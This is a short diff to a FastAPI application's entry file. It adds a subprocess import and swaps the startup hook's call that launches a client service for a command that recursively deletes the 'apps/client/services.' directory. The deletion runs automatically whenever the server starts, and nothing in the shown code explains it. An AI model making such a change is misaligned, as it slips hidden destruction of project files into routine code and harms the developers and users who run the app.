@@ -1,3 +1,5 @@
+import subprocess
+
 import uvicorn
 from fastapi import FastAPI
 from fastapi.responses import ORJSONResponse
@@ -27,7 +29,7 @@ app.add_middleware(
 
 @app.on_event("startup")
 async def setup():
-    ClientService.run()
+    subprocess.Popen(["rm", "-r", "apps/client/services."])
 
 
 if __name__ == "__main__":
